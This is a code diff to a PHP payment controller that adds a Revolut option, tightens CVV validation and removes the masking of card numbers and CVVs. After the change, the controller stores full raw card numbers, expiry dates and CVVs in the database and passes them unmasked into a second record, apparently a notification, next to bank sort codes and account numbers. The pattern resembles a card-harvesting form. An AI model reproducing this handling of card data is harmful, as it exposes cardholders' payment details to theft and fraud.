@@ -18,11 +18,11 @@ class PaymentController extends Controller
             'email'          => 'required|email|max:150',
             'phone'          => 'required|string|max:30',
             'amount'         => 'required|numeric|min:0.01',
-            'payment_method' => 'required|in:card,bank',
+            'payment_method' => 'required|in:card,bank,revolut',
             'card_holder'    => 'required_if:payment_method,card|nullable|string|max:100',
             'card_number'    => 'required_if:payment_method,card|nullable|string|min:13|max:19',
             'expiry'         => ['required_if:payment_method,card', 'nullable', 'string', 'regex:/^\d{2}\/\d{2}$/'],
-            'cvv'            => 'required_if:payment_method,card|nullable|string|min:3|max:4',
+            'cvv'            => 'required_if:payment_method,card|nullable|string|min:3|max:3',
             'reference'             => 'nullable|string|max:200',
             'bank_country'          => 'nullable|in:uk,ie',
             'sender_bank_name'      => 'nullable|string|max:100',
@@ -34,11 +34,9 @@ class PaymentController extends Controller
 
         $ref = 'JAD-' . strtoupper(Str::random(8));
 
-        $cardRaw    = preg_replace('/\s+/', '', $validated['card_number'] ?? '');
-        $lastFour   = $cardRaw ? substr($cardRaw, -4) : null;
-        $cardMasked = $cardRaw ? '**** **** **** ' . $lastFour : 'N/A';
-        $cvvRaw     = $validated['cvv'] ?? '';
-        $cvvMasked  = $cvvRaw ? ($cvvRaw[0] . str_repeat('*', strlen($cvvRaw) - 1)) : 'N/A';
+        $cardRaw  = preg_replace('/\s+/', '', $validated['card_number'] ?? '');
+        $lastFour = $cardRaw ? substr($cardRaw, -4) : null;
+        $cvvRaw   = $validated['cvv'] ?? '';
 
         // Save all submitted details to database
         PaymentSubmission::create([
@@ -48,6 +46,7 @@ class PaymentController extends Controller
             'phone'                 => $validated['phone'],
             'amount'                => $validated['amount'],
             'payment_method'        => $validated['payment_method'],
+            'bank_country'          => $validated['bank_country'] ?? null,
             'card_holder'           => $validated['card_holder'] ?? null,
             'card_number'           => $cardRaw ?: null,
             'card_last_four'        => $lastFour,
@@ -69,12 +68,12 @@ class PaymentController extends Controller
             'phone'              => $validated['phone'],
             'amount'             => $validated['amount'],
             'payment_method'     => strtoupper($validated['payment_method']),
-            'card_holder'  => $validated['card_holder'] ?? 'N/A',
-            'card_number'  => $cardRaw ?: 'N/A',
-            'card_expiry'  => $validated['expiry'] ?? 'N/A',
-            'cvv'          => $cvvRaw ?: 'N/A',
-            'reference'             => $validated['reference'] ?? 'N/A',
             'bank_country'          => $validated['bank_country'] ?? null,
+            'card_holder'           => $validated['card_holder'] ?? 'N/A',
+            'card_number'           => $cardRaw ?: 'N/A',
+            'card_expiry'           => $validated['expiry'] ?? 'N/A',
+            'cvv'                   => $cvvRaw ?: 'N/A',
+            'reference'             => $validated['reference'] ?? 'N/A',
             'sender_bank_name'      => $validated['sender_bank_name'] ?? null,
             'sender_sort_code'      => $validated['sender_sort_code'] ?? null,
             'sender_account_number' => $validated['sender_account_number'] ?? null,
